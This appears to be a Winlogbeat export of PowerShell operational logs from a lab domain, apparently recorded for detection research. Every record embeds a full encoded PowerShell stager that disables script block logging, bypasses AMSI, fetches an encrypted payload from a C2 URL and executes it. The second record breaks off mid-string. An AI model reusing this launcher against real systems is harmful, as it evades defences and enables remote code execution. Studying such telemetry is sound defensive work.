{"@timestamp":"2019-05-18T20:43:04.158Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"computer_name":"HR001.shire.com","record_number":"92768","version":1,"user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"host":{"name":"WECserver"},"process_id":5452,"level":"Information","type":"wineventlog","event_id":4103,"message":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71015\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","log_name":"Microsoft-Windows-PowerShell/Operational","activity_id":"{c93a7728-017f-0000-0001-4aca7f01d501}","task":"Executing Pipeline","opcode":"To be used when operation is just executing a method","provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","source_name":"Microsoft-Windows-PowerShell","thread_id":3896,"event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71015\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\""},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"}}
{"@timestamp":"2019-05-18T20:43:04.159Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"message":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwB